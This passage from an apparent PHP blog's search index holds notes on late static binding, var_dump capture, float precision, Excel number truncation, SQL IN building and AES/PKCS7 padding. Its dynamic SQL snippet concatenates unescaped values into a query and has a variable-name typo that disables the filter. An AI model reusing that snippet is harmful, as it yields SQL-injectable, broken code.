class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">B</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> C;</span><br><span class=\"line\">$c-&gt;test();</span><br><span class=\"line\">C::test();</span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// B</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// B</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>老實說上面例子花我很多時間想的，重寫兩次文章(因為一直發現理解錯誤)<br>只要進入 B 的 parent,static,self 再跳到 A 的 test function 裡面的<code>static::who();</code>(後期靜態綁定)<br>就會抓當下 class<br>不管是<code>實例</code>或者 <code>static</code><br>都會印出 C</p>\n<hr>\n<p>下面是直接在 B 的 test()做，第一次的時候做轉發，跳到下一個 function *_沒有<em><code>用後期靜態綁定</code><br>而且\\</em>_CLASS__(self)，只會抓到原本的類別(非實例出來的類別)</p>\n<p>這邊的 static 轉發(forward)同等於<code>forward_static_call()</code><br>所以下面這個範例，__CLASS__改成<code>get_called_class()</code>一樣會變成上面結果一致</p>\n<ul>\n<li><a href=\"http://php.net/manual/zh/function.forward-static-call.php\" target=\"_blank\" rel=\"noopener\">PHP: forward_static_call - Manual</a></li>\n</ul>\n<h2 id=\"forward-static-call-和-call-user-func\"><a href=\"#forward-static-call-和-call-user-func\" class=\"headerlink\" title=\"forward_static_call 和 call_user_func\"></a>forward_static_call 和 call_user_func</h2><p>這兩個 function 功能很像，但差在用在 static 地方。<br>重點是下面這兩個<code>call_user_func(&#39;A::bar&#39;); //non-forwarding, &#39;A&#39;</code>和<code>forward_static_call(&#39;A::bar&#39;); //forwarding, &#39;B&#39;</code><br>這兩個讓我想到 JavaScript 閉包用到(this)這個東西，但 js 解決方法是用<code>箭頭函式</code>和<code>var that = this</code>解決(題外話，請忽略這段)</p>\n<p>但 forward_static_call 有一個例外，當父類別到子類別的話，不做轉發動做，看下面範例</p>\n<p><a href=\"https://stackoverflow.com/questions/5061476/php-forward-static-call-vs-call-user-func\" target=\"_blank\" rel=\"noopener\">php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">The difference is just that forward_static_call does not reset the &quot;called class&quot; information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self).</span><br><span class=\"line\"></span><br><span class=\"line\">Example:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A &#123;</span><br><span class=\"line\">    static function bar() &#123; echo get_called_class(), &quot;\\n&quot;; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class B extends A &#123;</span><br><span class=\"line\">    static function foo() &#123;</span><br><span class=\"line\">        parent::bar(); //forwards static info, &apos;B&apos;</span><br><span class=\"line\">        call_user_func(&apos;parent::bar&apos;); //forwarding, &apos;B&apos;</span><br><span class=\"line\">        call_user_func(&apos;static::bar&apos;); //forwarding, &apos;B&apos;</span><br><span class=\"line\">        call_user_func(&apos;A::bar&apos;); //non-forwarding, &apos;A&apos;</span><br><span class=\"line\">        forward_static_call(&apos;parent::bar&apos;); //forwarding, &apos;B&apos;</span><br><span class=\"line\">        forward_static_call(&apos;A::bar&apos;); //forwarding, &apos;B&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">B::foo();</span><br><span class=\"line\"></span><br><span class=\"line\">Note that forward_static_call refuses to forward if going down the class hierarchy:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A &#123;</span><br><span class=\"line\">    static function foo() &#123;</span><br><span class=\"line\">        forward_static_call(&apos;B::bar&apos;); //non-forwarding, &apos;B&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class B extends A &#123;</span><br><span class=\"line\">    static function bar() &#123; echo get_called_class(), &quot;\\n&quot;; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">A::foo();</span><br><span class=\"line\"></span><br><span class=\"line\">Finally, note that forward_static_call can only be called from within a class method.</span><br></pre></td></tr></table></figure>\n<p>The difference is just that forward_static_call does not reset the “called class” information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self).</p>\n<p>最後我覺得 static 和\\$this 很相似<br>但看到這篇裡面有寫差異<br>雖然我有一點 Java 物件導向觀念，但是 PHP 物件導向還滿難理解</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">static 和 $this 有点类似，但又有区别：</span><br><span class=\"line\"></span><br><span class=\"line\">    $this 指向的对象所属的类和 static 指向的类相同。</span><br><span class=\"line\">    $this 不能用于静态方法中，也不能访问类的静态属性和常量。</span><br><span class=\"line\">    $this 指向的是实际调用的对象。</span><br><span class=\"line\">    static 可以用于静态或非静态方法中，也可以访问类的静态属性、静态方法、常量和非静态方法，但不能访问非静态属性。</span><br><span class=\"line\">    static 指向的是实际调用时的对象所属的类。</span><br><span class=\"line\">---------------------</span><br><span class=\"line\">作者：lamp_yang_3533</span><br><span class=\"line\">来源：CSDN</span><br><span class=\"line\">原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453</span><br><span class=\"line\">版权声明：本文为博主原创文章，转载请附上博文链接！</span><br></pre></td></tr></table></figure>\n<h2 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h2><ul>\n<li><a href=\"http://asika.windspeaker.co/post/3483-php-static-self\" target=\"_blank\" rel=\"noopener\">PHP 的 static 與 self 兩個關鍵字的差異 | Asika Lab 飛鳥實驗室</a></li>\n<li><a href=\"http://php.net/manual/en/language.oop5.late-static-bindings.php\" target=\"_blank\" rel=\"noopener\">PHP: Late Static Bindings - Manual</a></li>\n<li><a href=\"http://php.net/manual/zh/function.forward-static-call.php\" target=\"_blank\" rel=\"noopener\">PHP: forward_static_call - Manual</a></li>\n<li><a href=\"http://landcareweb.com/questions/30864/php-forward-static-call-vs-call-user-func\" target=\"_blank\" rel=\"noopener\">PHP forward_static_call vs call_user_func | landcareweb.com</a></li>\n<li><a href=\"http://rocksaying.tw/archives/10796755.html\" target=\"_blank\" rel=\"noopener\">PHP 5.3/6 新增功能 - Late Static Bindings - 石頭閒語</a></li>\n<li><a href=\"https://stackoverflow.com/questions/5061476/php-forward-static-call-vs-call-user-func\" target=\"_blank\" rel=\"noopener\">php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow</a></li>\n<li><a href=\"https://codeday.me/bug/20181023/313202.html\" target=\"_blank\" rel=\"noopener\">PHP forward_static_call 和 call_user_func - 代码日志</a></li>\n<li><a href=\"http://php.net/manual/zh/function.forward-static-call.php\" target=\"_blank\" rel=\"noopener\">PHP: forward_static_call - Manual</a></li>\n<li><a href=\"http://www.cleey.com/blog/single/id/854.html\" target=\"_blank\" rel=\"noopener\">PHP 关于 self:: 和 static:: | 随意博客</a></li>\n<li><a href=\"http://www.pilishen.com/posts/php-late-static-bindings-in-laravel\" target=\"_blank\" rel=\"noopener\">通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程</a></li>\n<li><a href=\"http://miggo.pixnet.net/blog/post/30799978-%5Bphp%E8%A7%80%E5%BF%B5%5Dself%E5%92%8C%24this%E7%9A%84%E5%B7%AE%E7%95%B0\" target=\"_blank\" rel=\"noopener\">[PHP 觀念]self 和\\$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 ::</a></li>\n</ul>\n","categories":["PHP"],"tags":["php","static"]},{"title":"PHP var_dump 輸出到變數的方法","url":"/blog/2019/10/30/PHP-var-dump-%E8%BC%B8%E5%87%BA%E5%88%B0%E8%AE%8A%E6%95%B8%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>實務上 log 不是只會記在頁面上<br>也會在 console 裡面</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">ob_start();</span><br><span class=\"line\">var_dump($party);</span><br><span class=\"line\">$result = ob_get_clean();</span><br><span class=\"line\">Log::write(<span class=\"string\">'result =&gt; '</span>. $result , <span class=\"string\">\"xxxxxxx\"</span> );</span><br></pre></td></tr></table></figure>","categories":["PHP"],"tags":["php","var_dump"]},{"title":"PHP 做浮點數需要注意的事情","url":"/blog/2019/08/04/PHP-%E5%81%9A%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>最近公司做報表程式，看到裡面程式會 0.3254*1000 先做運算<br>然後運算完後會<code>除1000</code><br>原本猜想是不是有浮點數問題<br>但我印象 0.1+0.2=0.3，這部分 PHP 好像沒有什麼問題<br><a href=\"https://0.30000000000000004.com/\" target=\"_blank\" rel=\"noopener\">0.30000000000000004.com/</a><br>但我今天看到這篇有提到<a href=\"https://kknews.cc/zh-tw/finance/y86vrrj.html\" target=\"_blank\" rel=\"noopener\">php 踩過的那些坑（1）浮點數計算 - 每日頭條</a></p>\n<a id=\"more\"></a>\n<blockquote>\n<p>二、防坑攻略：<br>1、通過乘 100 的方式轉化為整數加減，然後在除以 100 轉化回來……<br>2、使用 number_format 轉化成字符串，然後在使用（float）強轉回來……<br>3、php 提供了高精度計算的函數庫，實際上就是為了解決這個浮點數計算問題而生的。<br>原文網址：<a href=\"https://kknews.cc/finance/y86vrrj.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/finance/y86vrrj.html</a></p>\n</blockquote>\n<p>使用 bcsub 方式可以解決問題，但記得後面要加入要算出來的浮點數</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"number\">2586</span>;</span><br><span class=\"line\">$b = <span class=\"number\">2585.98</span>;</span><br><span class=\"line\">var_dump($a-$b);</span><br></pre></td></tr></table></figure>\n<p>有找到這個文章原始來源<br>這幾篇，也不錯</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/phpfensi/p/8143355.html\" target=\"_blank\" rel=\"noopener\">php 踩过的那些坑(1) isset()详解 - 壁虎漫步. - 博客园</a> <a href=\"/blog/2019/08/04/PHP-做浮點數需要注意的事情/web1.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.cnblogs.com/phpfensi/p/8143358.html\" target=\"_blank\" rel=\"noopener\">php 踩过的那些坑(2) strpos 引发的血案 - 壁虎漫步. - 博客园</a> <a href=\"/blog/2019/08/04/PHP-做浮點數需要注意的事情/web2.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.cnblogs.com/phpfensi/p/8143360.html\" target=\"_blank\" rel=\"noopener\">php 踩过的那些坑(3) 数据类型转换 - 壁虎漫步. - 博客园</a> <a href=\"/blog/2019/08/04/PHP-做浮點數需要注意的事情/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.cnblogs.com/phpfensi/p/8143363.html\" target=\"_blank\" rel=\"noopener\">php 踩过的那些坑(4) false,NULL,0,’’详解 - 壁虎漫步. - 博客园</a> <a href=\"/blog/2019/08/04/PHP-做浮點數需要注意的事情/web4.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.cnblogs.com/phpfensi/p/8143367.html\" target=\"_blank\" rel=\"noopener\">php 踩过的那些坑（5）浮点数计算 - 壁虎漫步. - 博客园</a> <a href=\"/blog/2019/08/04/PHP-做浮點數需要注意的事情/web5.png\" title=\"備份圖\">備份圖</a></li>\n</ul>\n<p>更多作者寫的內容</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/phpfensi/category/594117.html\" target=\"_blank\" rel=\"noopener\">PHP - 随笔分类 - 壁虎漫步. - 博客园</a></li>\n</ul>\n","categories":["PHP"],"tags":["php"]},{"title":"PHP_xlsx_writer  excel 15位數會進動進位的問題","url":"/blog/2018/05/31/PHP-xlsx-writer-excel-15%E4%BD%8D%E6%95%B8%E6%9C%83%E9%80%B2%E5%8B%95%E9%80%B2%E4%BD%8D%E7%9A%84%E5%95%8F%E9%A1%8C/","content":"<p>最近公司用xlsx_writer做報表<a href=\"https://github.com/mk-j/PHP_XLSXWriter\" target=\"_blank\" rel=\"noopener\">mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP</a><br>發現使用者編號(uid)竟然跟DB不一樣….<br>讓我震驚了!!!以為我程式出BUG了…</p>\n<a id=\"more\"></a>\n<p>原本以為是我程式哪裡出問題，結果發現var_dump正常<br>打開Excel就不正常了</p>\n<p>15位數Excel會自動補0<br><a href=\"http://waterisme.pixnet.net/blog/post/33761621-%E5%A6%82%E4%BD%95%E8%A7%A3%E6%B1%BAexcel%E6%95%B8%E5%AD%97%E9%81%8E%E9%95%B7%E8%87%AA%E5%8B%95%E5%8A%A00%E7%9A%84%E5%95%8F%E9%A1%8C%EF%BC%9F\" target=\"_blank\" rel=\"noopener\">如何解決EXCEL數字過長自動加0的問題？ @ 阿水資訊站 :: 痞客邦 ::</a></p>\n<p>沒想到採到這個雷…..</p>\n<p>明明有對header做string<br>但超過15位數就不正常<br>其他有設定string(沒超過15位數)都顯示正常</p>\n<p>不過最後神同事用<code>=&quot;123456789123456789123456789&quot;</code><br>解決問題!!</p>\n","categories":["PHP"],"tags":["PHP","excel","xlsx"]},{"title":"PHP 產生動態sql技巧(IN)","url":"/blog/2018/07/03/PHP-%E7%94%A2%E7%94%9F%E5%8B%95%E6%85%8Bsql%E6%8A%80%E5%B7%A7-IN/","content":"<p>由於mysql處理IN效能不是很好，大量資料做的時候速度會很慢<br>有用PHP程式動態產生SQL，今天有看到很好用的寫法<br>筆記一下</p>\n<a id=\"more\"></a>\n<p>NOTE主要用substr減少最後一個<code>,</code><br>再放入SQL變數裡面去<br>寫起來很簡單</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\">$filter = $list = <span class=\"string\">''</span>;    </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is_array($array_uid))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">foreach</span>($array_uid <span class=\"keyword\">as</span> $user_val)&#123;</span><br><span class=\"line\">                $list .= <span class=\"string\">\"'\"</span>.$user_val[<span class=\"string\">'uid'</span>].<span class=\"string\">\"'\"</span>;</span><br><span class=\"line\">                $list .= <span class=\"string\">\",\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $list = substr($list, <span class=\"number\">0</span>, <span class=\"number\">-1</span>);</span><br><span class=\"line\">            $fliter = <span class=\"string\">\" AND u.uid NOT IN (\"</span>.$list.<span class=\"string\">\") \"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $sql = <span class=\"string\">\"select * from xxx where 1=1  $filter \"</span>;</span><br></pre></td></tr></table></figure>\n","categories":["PHP"],"tags":["sql","PHP","IN","NOT IN"]},{"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) & 一些加密雜記","url":"/blog/2019/06/15/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/","content":"<p>最近同事搞不定 PHP7 AES 加密<br>由於我們從 PHP5 升級到 PHP7<br>我們換成 openssl 但是到 Android APP 解憑證的時候竟然驗證結果會不一樣??<br>被同事抓去救火(同事也處理不行 XD)<br>然後不熟加密原理的我<br>第一件事情就是去 github 上面找 <a href=\"https://github.com/ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt\" target=\"_blank\" rel=\"noopener\">ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal.</a><br>沒想到剛好可以用!!! (運氣好)<br>不過還是卡在 簽章 結果會不一樣</p>\n<a id=\"more\"></a>\n<h2 id=\"AES-一些加密範例\"><a href=\"#AES-一些加密範例\" class=\"headerlink\" title=\"AES 一些加密範例\"></a>AES 一些加密範例</h2><p>今天又找了幾個 AES 加密</p>\n<ul>\n<li><a href=\"https://github.com/lyhiving/aes\" target=\"_blank\" rel=\"noopener\">lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密</a></li>\n<li><a href=\"https://github.com/pkuoliver/EasyAES\" target=\"_blank\" rel=\"noopener\">pkuoliver/EasyAES: AES encrypt/decrypt, Android, iOS, php compatible(兼容 php, Android, iOS 平台)</a></li>\n<li><a href=\"https://github.com/simplephp/php-java-AES-128-ECB\" target=\"_blank\" rel=\"noopener\">simplephp/php-java-AES-128-ECB: PHP &amp;&amp; JAVA AES/ECB/PKCS5Padding 相互加解密</a></li>\n<li><a href=\"https://github.com/stevenholder/PHP-Java-AES-Encrypt\" target=\"_blank\" rel=\"noopener\">stevenholder/PHP-Java-AES-Encrypt: Pass data AES encrypted between PHP and Java.</a></li>\n</ul>\n<h2 id=\"當日狀況\"><a href=\"#當日狀況\" class=\"headerlink\" title=\"當日狀況\"></a>當日狀況</h2><p>首先紀錄，先整理那天的狀態<br>原本我同事會先做 簽章 → AES 加密<br>他們做簽章 check 都通過<br>但是到 AES 一直失敗<br>後來他們使用 openssl 一直試 AES<br>我用了 <a href=\"https://github.com/ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt\" target=\"_blank\" rel=\"noopener\">ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal.</a> 可以用了<br>(但可能沒有注意 console 後面有空白)<br>魔鬼總是藏在細節!!</p>\n<p>後來套用我那個加密，發現 APP 做簽章反查竟然不正確??<br>這時候我同事發現後面有空白!!!<br>原因是這個導致最簽章反查導致不正確<br>但是 PHP 內容印出來也不正確</p>\n<h2 id=\"簽章\"><a href=\"#簽章\" class=\"headerlink\" title=\"簽章\"></a>簽章</h2><p>首先講一下，我目前認知簽章是怕內容有被串改<br>所以正常近來如如內容 array 會改他做 <code>json_encode</code><br>在做 base64_url_encode(內容)<br>會做 hash_hmac <a href=\"https://www.php.net/manual/en/function.hash-hmac.php\" target=\"_blank\" rel=\"noopener\">PHP: hash_hmac - Manual</a></p>\n<ul>\n<li><a href=\"https://blog.csdn.net/dengjiexian123/article/details/53313913\" target=\"_blank\" rel=\"noopener\">php 中使用 hash_hmac 函数实现 HMAC-SHA1 签名算法的来龙去脉 - dengjiexian123 的专栏 - CSDN 博客</a></li>\n<li><a href=\"https://blog.m157q.tw/posts/2017/12/25/differences-between-encryption-and-hashing/\" target=\"_blank\" rel=\"noopener\">加密和雜湊有什麼不一樣？ | Just for noting</a></li>\n<li><a href=\"https://gist.github.com/frankyueh/3d5d45236339ff0097a7\" target=\"_blank\" rel=\"noopener\">Code Sign - 程式碼數位簽章</a></li>\n<li><a href=\"https://blog.darkthread.net/blog/base64-in-querystring/\" target=\"_blank\" rel=\"noopener\">TIPS-用 URL 傳送 Base64 編碼-黑暗執行緒</a></li>\n</ul>\n<p>這時候還會做 base64 url encode(簽章)</p>\n<blockquote>\n<p>why 用 base64 url encode ?<br><a href=\"http://xxxx/?token=xxxxxxx\" target=\"_blank\" rel=\"noopener\">http://xxxx/?token=xxxxxxx</a><br>這時候不做 base64 url encode，可能就會有問題</p>\n</blockquote>\n<p><del>這之間可能可以去換一些符號</del> (+/改為*-或._) 如上補充 url 不能放+/</p>\n<ul>\n<li><a href=\"https://blog.longwin.com.tw/2018/12/php-base64-url-encode-decode-2018/\" target=\"_blank\" rel=\"noopener\">PHP 處理 Base64 URL 的編碼、解碼方式 | Tsung’s Blog</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html\" target=\"_blank\" rel=\"noopener\">JSON Web Token 入门教程 - 阮一峰的网络日志</a></li>\n</ul>\n<p>裡面也有提到 base64 url encode<br>PS:<a href=\"https://zh.wikipedia.org/wiki/Base64\" target=\"_blank\" rel=\"noopener\">Base64 - 維基百科，自由的百科全書</a>，原因為何我也不確定，目前猜測可能是怕放在 url 上面??</p>\n<p>這時候內容會是<code>簽章</code>+ <code>.(間隔符號)</code>+<code>內容</code><br>出來的時候我們會用 AES 加密<br>這時候因為是 binary，所以還會做 Base64(也可以用自己去換一些符號)</p>\n<p>APP 端接收到要做檢查<br>首先解 base64 url decode<del>(或自訂反解 fucntion)</del><br>去做 AES 解密<br>這時候會是 binary(但是 PHP 出來是 string?) 這邊可能還要確認<br>我們要再做 base64 url decode</p>\n<blockquote>\n<p>這邊講詳細一點<br><code>簽章</code>+ <code>.(間隔符號)</code>+<code>內容</code><br>這時候可以做反簽章<br>簽章跟內容是分開獨立各做<code>base64 url decode</code></p>\n</blockquote>\n<p>內容解出來，在自己做 <code>hash_hmac</code><br>可以得到自己<code>簽章內容</code></p>\n<p>這時候跟風包給的簽章內容有沒有一致?<br>一致就是這個資料沒有被串改</p>\n<p><strong>簽章講完了，重頭戲要開始了</strong></p>\n<h2 id=\"為什麼送到-Android-有奇怪的空白字元-PKCS7\"><a href=\"#為什麼送到-Android-有奇怪的空白字元-PKCS7\" class=\"headerlink\" title=\"為什麼送到 Android 有奇怪的空白字元??(PKCS7)\"></a>為什麼送到 Android 有奇怪的空白字元??(PKCS7)</h2><p>是 PKCS7 的關係</p>\n<p>簡單說明一下，因為 AES 加密必須是 16 倍數(應該= =|||，是聽到這個原因)<br>當你資料沒有給到一定的數字，它會自動幫你補</p>\n<p>我們當下用 workaround 方式先去解在我們資料帶<code>===</code>講好符號先去解取<br>但最佳解不是這樣做</p>\n<ul>\n<li><a href=\"https://www.heylc.com/fuanyuopenssl.html\" target=\"_blank\" rel=\"noopener\">关于 mcrypt_encrypt 和 openssl_encrypt 加密结果不一致的解决 – 继续生活</a></li>\n<li><a href=\"https://www.xxling.com/blog/article/3114.aspx\" target=\"_blank\" rel=\"noopener\">PHP 由 mcrypt 扩展加密改为 openssl 扩展加密|xiaolingzi’s blog | 生活是多彩的 | Life is colorful</a></li>\n<li><a href=\"https://kknews.cc/zh-tw/other/9pgvlpl.html\" target=\"_blank\" rel=\"noopener\">php 遷移 Mcrypt 至 OpenSSL 加密算法的詳細介紹（代碼示例） - 每日頭條</a></li>\n<li><a href=\"https://zhiwei.li/text/2009/05/17/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84pkcs5%E5%92%8Cpkcs7%E5%A1%AB%E5%85%85/\" target=\"_blank\" rel=\"noopener\">对称加密算法的 PKCS5 和 PKCS7 填充 | Zhiwei Li</a></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * PKCS7Encoder class</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * 提供基于PKCS7算法的加解密接口.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PKCS7Encoder</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> $block_size = <span class=\"number\">32</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t* 对需要加密的明文进行填充补位</span></span><br><span class=\"line\"><span class=\"comment\">\t* <span class=\"doctag\">@param</span> $text 需要进行填充补位操作的明文</span></span><br><span class=\"line\"><span class=\"comment\">\t* <span class=\"doctag\">@return</span> 补齐明文字符串</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span><span class=\"params\">($text)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t$block_size = <span class=\"keyword\">self</span>::$block_size;</span><br><span class=\"line\">\t\t$text_length = strlen($text);</span><br><span class=\"line\">\t\t<span class=\"comment\">//计算需要填充的位数</span></span><br><span class=\"line\">\t\t$amount_to_pad = $block_size - ($text_length % $block_size);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( $amount_to_pad == <span class=\"number\">0</span> )</span><br><span class=\"line\">\t\t\t$amount_to_pad = $block_size;</span><br><span class=\"line\">\t\t<span class=\"comment\">//获得补位所用的字符</span></span><br><span class=\"line\">\t\t$pad_chr = chr($amount_to_pad);</span><br><span class=\"line\">\t\t$tmp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ( $index = <span class=\"number\">0</span>; $index &lt; $amount_to_pad; $index++ )</span><br><span class=\"line\">\t\t\t$tmp .= $pad_chr;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $text . $tmp;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t* 对解密后的明文进行补位删除</span></span><br><span class=\"line\"><span class=\"comment\">\t* <span class=\"doctag\">@param</span> decrypted 解密后的明文</span></span><br><span class=\"line\"><span class=\"comment\">\t* <span class=\"doctag\">@return</span> 删除填充补位后的明文</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">decode</span><span class=\"params\">($text)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t$pad = ord(substr($text, <span class=\"number\">-1</span>));</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($pad &lt; <span class=\"number\">1</span> || $pad &gt; <span class=\"keyword\">self</span>::$block_size)</span><br><span class=\"line\">\t\t\t$pad = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> substr($text, <span class=\"number\">0</span>, (strlen($text) - $pad));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ---------------------</span></span><br><span class=\"line\"><span class=\"comment\">// 作者：qq_34089779</span></span><br><span class=\"line\"><span class=\"comment\">// 来源：CSDN</span></span><br><span class=\"line\"><span class=\"comment\">// 原文：https://blog.csdn.net/qq_34089779/article/details/79066961</span></span><br><span class=\"line\"><span class=\"comment\">// 版权声明：本文为博主原创文章，转载请附上博文链接！</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://blog.csdn.net/qq_34089779/article/details/79066961\" target=\"_blank\" rel=\"noopener\">PKCS7 算法基于 php 的加解密 - qq_34089779 的博客 - CSDN 博客</a></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PKCS7Padding</span><span class=\"params\">($str, $block_size)</span> </span>&#123;</span><br><span class=\"line\">    $padding_char = $block_size - (strlen($str) % $block_size);</span><br><span class=\"line\">    $padding_str = str_repeat(chr($padding_char),$padding_char);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $str.$padding_str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PKCS7UnPadding</span><span class=\"params\">($str)</span> </span>&#123;</span><br><span class=\"line\">    $char=substr($str,<span class=\"number\">-1</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">    $num=ord($char);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($num&gt;<span class=\"number\">0</span> &amp;&amp; $num &lt;= strlen($str)) &#123;</span><br><span class=\"line\">        $str = substr($str, <span class=\"number\">0</span>, <span class=\"number\">-1</span> * $num);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"http://www.imsry.cn/posts/5c3bf0b6.html\" target=\"_blank\" rel=\"noopener\">PHP 加解密算法使用 openssl 替换 mcrypt 扩展 | 牛牛大作栈</a> <a 